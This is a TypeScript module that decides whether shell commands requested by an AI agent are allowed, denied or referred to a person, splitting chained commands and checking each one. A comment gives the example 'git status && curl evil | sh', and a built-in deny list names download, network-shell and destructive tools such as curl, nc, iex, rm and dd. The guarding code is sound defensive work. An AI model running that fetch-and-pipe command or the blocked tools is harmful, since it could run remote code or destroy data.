/**
 * Allow/deny analysis for shell commands an agent asks to run.
 *
 * The goal is a *safe* "always allow": a rule such as `git status` must never
 * silently cover `git status && curl evil | sh`. So a command line is split into
 * its sub-commands, every one must be allowed and none denied, and anything that
 * cannot be analysed (command substitution, unbalanced quotes, redirection to a
 * file) falls back to asking the person.
 *
 * Pure and platform-agnostic: it reasons about text, never executes anything.
 */

export type ShellDecision = 'allow' | 'deny' | 'ask'

export interface ShellRules {
  /** Literal prefixes (`git status`) or `/regex/` matched against one sub-command. */
  allow: string[]
  deny: string[]
}

export interface ShellEvaluation {
  decision: ShellDecision
  /** Why, in terms a person can read; one entry per relevant sub-command. */
  reasons: string[]
  subcommands: string[]
  /** The deny came from the built-in list, not from a rule someone wrote. */
  byDefault?: true
}

/** Commands that are denied unless a rule explicitly allows them... and even then they only ask. */
const DEFAULT_DENY = new Set([
  'rm', 'rmdir', 'del', 'erase', 'rd', 'curl', 'wget', 'invoke-webrequest', 'iwr', 'chmod', 'chown', 'eval', 'sudo', 'su',
  'dd', 'mkfs', 'format', 'shutdown', 'reboot', 'kill', 'killall', 'taskkill', 'ssh', 'scp', 'nc', 'ncat', 'powershell', 'pwsh',
  // PowerShell equivalents (names are compared lower-case).
  'remove-item', 'ri', 'clear-content', 'invoke-expression', 'iex', 'invoke-restmethod', 'irm', 'start-process', 'stop-process',
  'set-executionpolicy', 'format-volume', 'clear-disk', 'remove-itemproperty'
])

/** Interpreters and shells: allowing one is allowing everything, so they are never suggested. */
const NEVER_SUGGEST = new Set([
  'sh', 'bash', 'zsh', 'fish', 'cmd', 'powershell', 'pwsh', 'node', 'python', 'python3', 'ruby', 'perl', 'php', 'deno', 'bun',
  'sudo', 'su', 'eval', 'exec', 'env', 'xargs', 'curl', 'wget', 'ssh', 'nc', 'ncat', 'rm', 'del', 'chmod', 'chown', 'dd'
])

/** CLIs whose first argument is a verb, so the useful rule scope is two tokens. */
const MULTI_LEVEL = new Set(['git', 'npm', 'pnpm', 'yarn', 'docker', 'cargo', 'go', 'kubectl', 'gh', 'dotnet', 'pip', 'poetry', 'make'])
/** `npm run build` is a rule about a script, so it takes a third token. */
const RUN_VERBS = new Set(['run', 'run-script', 'exec'])

const UNANALYSABLE = /\$\(|`|<\(|>\(|\$\{[^}]*\}|\beval\b/

/** Flags that turn an otherwise harmless command into a writer/executor. */
const DANGEROUS_FLAGS: Array<{ command: string; flag: RegExp; why: string }> = [
  { command: 'find', flag: /^-(exec|execdir|delete|ok|okdir|fprint|fls)\b/, why: 'find can run or delete files' },
  { command: 'sed', flag: /^-i/, why: 'sed -i edits files' },
  { command: 'rg', flag: /^--(pre|hostname-bin)/, why: 'rg --pre runs a program' },
  { command: 'git', flag: /^(-c|--exec-path|--upload-pack|--receive-pack)/, why: 'this git option can run programs' },
  { command: 'git', flag: /^(-f|--force|--force-with-lease|--force-if-includes|-D|--hard|--mirror)$/, why: 'this git option discards or overwrites work' }
]

/** Splits on unquoted `&&`, `||`, `;`, `|`, `&` and newlines; null when it cannot be done safely. */
export function splitShellCommand(line: string): string[] | null {
  if (UNANALYSABLE.test(line)) return null
  const parts: string[] = []
  let current = ''
  let quote: '"' | "'" | null = null
  for (let i = 0; i < line.length; i += 1) {
    const ch = line[i]
    if (quote) {
      if (ch === quote) quote = null
      else if (ch === '\\' && quote === '"' && i + 1 < line.length) { current += ch + line[i + 1]; i += 1; continue }
      current += ch
      continue
    }
    if (ch === '"' || ch === "'") { quote = ch; current += ch; continue }
    if (ch === '\\' && i + 1 < line.length) { current += ch + line[i + 1]; i += 1; continue }
    const two = line.slice(i, i + 2)
    if (two === '&&' || two === '||') { parts.push(current); current = ''; i += 1; continue }
    // `2>&1` and `&>` are redirections, not a background operator.
    if (ch === '&' && (line[i - 1] === '>' || line[i + 1] === '>')) { current += ch; continue }
    if (ch === ';' || ch === '|' || ch === '&' || ch === '\n' || ch === '\r') { parts.push(current); current = ''; continue }
    current += ch
  }
  if (quote) return null
  parts.push(current)
  return parts.map((p) => p.trim()).filter(Boolean)
}

/** Unquoted tokens of one sub-command; quotes are removed, redirections are kept as tokens. */
export function tokenize(subcommand: string): string[] {
  const tokens: string[] = []
  let current = ''
  let quote: '"' | "'" | null = null
  let has = false
  for (const ch of subcommand) {
    if (quote) {
      if (ch === quote) quote = null
      else current += ch
      continue
    }
    if (ch === '"' || ch === "'") { quote = ch; has = true; continue }
    if (/\s/.test(ch)) {
      if (has || current) tokens.push(current)
      current = ''
      has = false
      continue
    }
    current += ch
  }
  if (has || current) tokens.push(current)
  return tokens
}

const baseName = (token: string): string => token.replace(/\\/g, '/').split('/').pop()!.toLowerCase().replace(/\.(exe|cmd|bat|ps1)$/, '')

function ruleMatches(rule: string, subcommand: string, tokens: string[]): boolean {
  const regex = rule.match(/^\/(.+)\/([a-z]*)$/)
  if (regex) {
    try { return new RegExp(regex[1], regex[2]).test(subcommand) } catch { return false }
  }
  const wanted = tokenize(rule)
  if (wanted.length === 0 || wanted.length > tokens.length) return false
  const head = baseName(tokens[0])
  if (head !== baseName(wanted[0])) return false
  return wanted.slice(1).every((token, index) => tokens[index + 1] === token)
}

/** Redirects that write somewhere other than the null device. */
function writesFile(tokens: string[]): boolean {
  for (let i = 0; i < tokens.length; i += 1) {
    const m = tokens[i].match(/^(?:\d*)(>>?|&>>?)(.*)$/)
    if (!m) continue
    const target = (m[2] || tokens[i + 1] || '').toLowerCase()
    if (target === '/dev/null' || target === 'nul' || target === '$null') continue
    if (/^&\d$/.test(target)) continue // 2>&1
    return true
  }
  return false
}

function dangerousFlag(tokens: string[]): string | null {
  const head = baseName(tokens[0])
  for (const entry of DANGEROUS_FLAGS) {
    if (entry.command === head && tokens.slice(1).some((t) => entry.flag.test(t))) return entry.why
  }
  return null
}

export function evaluateShellCommand(line: string, rules: ShellRules): ShellEvaluation {
  const subcommands = splitShellCommand(line)
  if (!subcommands || subcommands.length === 0) {
    return { decision: 'ask', reasons: ['The command uses substitution or quoting that cannot be analysed safely.'], subcommands: [] }
  }

  const reasons: string[] = []
  let allAllowed = true
  for (const sub of subcommands) {
    const tokens = tokenize(sub)
    if (tokens.length === 0) continue

    if (rules.deny.some((rule) => ruleMatches(rule, sub, tokens))) {
      return { decision: 'deny', reasons: [`"${sub}" is on the block list.`], subcommands }
    }
    const head = baseName(tokens[0])
    const explicitlyAllowed = rules.allow.some((rule) => ruleMatches(rule, sub, tokens))

    if (DEFAULT_DENY.has(head) && !explicitlyAllowed) {
      return { decision: 'deny', reasons: [`"${head}" is blocked by default.`], subcommands, byDefault: true }
    }
    const flag = dangerousFlag(tokens)
    if (flag) {
      reasons.push(`${flag}.`)
      allAllowed = false
      continue
    }
    if (writesFile(tokens)) {
      reasons.push(`"${sub}" writes to a file through redirection.`)
      allAllowed = false
      continue
    }
    if (!explicitlyAllowed) {
      reasons.push(`"${sub}" is not on the allow list.`)
      allAllowed = false
    }
  }
  return allAllowed ? { decision: 'allow', reasons: [], subcommands } : { decision: 'ask', reasons, subcommands }
}

export interface RuleSuggestion {
  rule: string
  /** What the rule would cover, for the confirmation button. */
  label: string
}

/**
 * The narrowest rule that makes sense for a line, or an empty list when
 * suggesting one would be unsafe. One entry per distinct sub-command; if any
 * sub-command cannot be suggested safely, nothing is.
 */
export function suggestRules(line: string): RuleSuggestion[] {
  const subcommands = splitShellCommand(line)
  if (!subcommands || subcommands.length === 0) return []
  const out: RuleSuggestion[] = []
  const seen = new Set<string>()
  for (const sub of subcommands) {
    const tokens = tokenize(sub)
    if (tokens.length === 0) continue
    const head = baseName(tokens[0])
    if (NEVER_SUGGEST.has(head) || DEFAULT_DENY.has(head) || dangerousFlag(tokens) || writesFile(tokens)) return []
    let depth = 1
    if (MULTI_LEVEL.has(head) && tokens[1] && !tokens[1].startsWith('-')) {
      depth = 2
      if (RUN_VERBS.has(tokens[1]) && tokens[2] && !tokens[2].startsWith('-')) depth = 3
    }
    const rule = tokens.slice(0, depth).join(' ')
    if (seen.has(rule)) continue
    seen.add(rule)
    out.push({ rule, label: `${rule} …` })
  }
  return out
}
